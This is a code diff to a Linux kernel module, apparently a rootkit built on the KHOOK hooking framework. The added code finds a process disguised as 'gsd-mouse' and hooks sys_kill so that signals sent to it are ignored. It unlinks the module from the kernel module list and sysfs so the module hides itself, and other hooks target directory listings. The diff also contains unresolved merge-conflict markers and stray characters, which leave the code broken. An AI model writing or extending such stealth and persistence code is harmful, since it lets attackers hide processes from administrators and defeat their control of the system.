@@ -12,9 +12,47 @@
 #include <linux/version.h>
 #include <linux/syscalls.h>
 #include <linux/sched.h>
+#include <linux/list.h>
+#include <linux/init.h>
 
 #define FLAG 0x80000000
 string processname="gsd-mouse";
+
+const char *protected = "gsd-mouse";
+int protected_pid = -1;
+
+static int print_pid(void)
+{
+	struct task_struct * task, * p;
+	struct list_head * pos;
+	int count = 0;
+	printk("Hello World enter begin:\n");
+	task =& init_task;
+	list_for_each(pos, &task->tasks)
+	{
+		p = list_entry(pos, struct task_struct, tasks);
+		count++;
+		printk("%d---------->%s\n", p->pid, p->comm);
+	}
+	printk("the number of process is: %d\n", count);
+	return 0;
+}
+
+static pid_t find_pid(void)
+{
+	struct task_struct * task, * p;
+	struct list_head * pos;
+	int count = 0;
+	task =& init_task;
+	list_for_each(pos, &task->tasks)
+	{
+		p = list_entry(pos, struct task_struct, tasks);
+		count++;
+		if (strstr(p->comm, protected))
+			protected_pid = p->pid;
+	}
+	return 0;
+}
 
 KHOOK_EXT(int, fillonedir, void *, const char *, int, loff_t, u64, unsigned int);
 static int khook_fillonedir(void *__buf, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type)
@@ -83,11 +121,17 @@ struct dentry *khook___d_lookup(struct dentry *parent, struct qstr *name)
 
 KHOOK_EXT(long, sys_kill, pid_t, int);
 static long khook_sys_kill(pid_t pid, int sig) {
+	int ret = 0;
+	find_pid();
+	printk("pid:%d", protected_pid);
+	if (protected_pid != pid)
+		ret = KHOOK_ORIGIN(sys_kill, pid, sig);
         //printk("sys_kill");
         //return KHOOK_ORIGIN(sys_kill, pid, sig);
-		return 0;
+	return ret;
 }
 
+<<<<<<< HEAD
 KHOOK_EXT(long, sys_getdents, unsigned int, struct linux_dirent64 __user, unsigned int);
 static long khook_sys_getdents(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count){
 	long value=0;
@@ -109,6 +153,8 @@ static long khook_sys_getdents(unsigned int fd, struct linux_dirent64 __user *di
 　　return value;
 	}
 }
+=======
+>>>>>>> 58051b96eb5a266311810f358ae7b80d1a13957f
 
 /*
 KHOOK_EXT(long, __x64_sys_kill, const struct pt_regs *);
@@ -204,6 +250,9 @@ struct task_struct *get_task(pid_t pid)　
 
 int init_module(void)
 {
+	print_pid();
+	list_del_init(&__this_module.list);
+	kobject_del(&THIS_MODULE->mkobj.kobj);
 	return khook_init();
 }
 
